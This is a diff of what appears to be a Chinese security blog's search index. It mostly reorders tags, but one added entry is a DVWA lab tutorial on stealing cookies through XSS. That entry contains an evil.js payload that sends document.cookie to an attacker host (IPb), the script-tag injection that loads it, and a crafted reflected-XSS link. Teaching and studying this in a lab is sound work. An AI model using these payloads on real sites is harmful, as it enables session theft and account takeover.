@@ -10,8 +10,8 @@
       </categories>
       <tags>
         <tag>python</tag>
-        <tag>ctf</tag>
         <tag>沙箱逃逸</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -132,6 +132,18 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[XSS打cookie]]></title>
+    <url>%2F2018%2F08%2F07%2FXSS%E6%89%93cookie%2F</url>
+    <content type="text"><![CDATA[如果web应用在用户输入的地方没有过滤特殊字符，比如&lt;, &gt;, ‘, “, &lt; script&gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有盗取用户cookie、跳转到恶意网站等，危害巨大，常年居Owasp top 10前三。 为了理解XSS盗取cookie的原理，进行实验。实验需准备：1）两台主机，主机A（IP地址为IPa）的用户正在浏览具有XSS的网站，主机B（IP地址为IPb）运行着攻击者的恶意代码。(2)DVWA安全等级设为low，充当具有XSS漏洞的网站。攻击者先上传一个JavaScript脚本到主机B上，即xss payload，这段脚本命名为evil.js，可以这样写： var img = document.createElement(&quot;img&quot;); img.src = &quot;http://IPb/log?&quot;+escape(document.cookie); document.body.appendChild(img); 这段代码将document.cookie作为对象传到主机B上。http://IPb/log可以存在，也可以不存在，因为这个请求会在主机B的服务器日志中留下日志。 主机A打开DVWA网站的XSS选项，在what’s your name输入框输入：&lt;script src=http://IPb/evil.js &gt;并提交：此时主机A的cookie值就会发送到主机B上，查看主机B的web日志：发现主机A的cookie值已经存在web日志里了。虽然是实验，但是如果DVWA有XSS漏洞，而攻击者构造一个http://IP/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2FIPb%2Fevil.js+%3E%3C%2Fscript%3E# ，诱骗了用户点击，那么用户的cookie就会发到主机B上，攻击者就可以登录受害者的账户了。]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[西门子PLC指令表]]></title>
     <url>%2F2018%2F08%2F05%2F%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8%2F</url>
     <content type="text"><![CDATA[位逻辑指令 时钟指令 通信指令 比较指令 转换指令 计数器指令 浮点数运算指令 整数运算指令 中断指令 逻辑运算指令 程序控制指令 传送指令 移位指令 字符串指令 表指令 定时器指令]]></content>
@@ -168,8 +180,8 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-        <tag>write up</tag>
         <tag>ICS</tag>
+        <tag>write up</tag>
         <tag>plc</tag>
         <tag>梯形图</tag>
       </tags>
@@ -182,10 +194,10 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>modbus</tag>
         <tag>ctf</tag>
-        <tag>write up</tag>
         <tag>ICS</tag>
+        <tag>modbus</tag>
+        <tag>write up</tag>
       </tags>
   </entry>
   <entry>
@@ -208,8 +220,8 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>modbus</tag>
         <tag>ICS</tag>
+        <tag>modbus</tag>
         <tag>工控协议</tag>
       </tags>
   </entry>
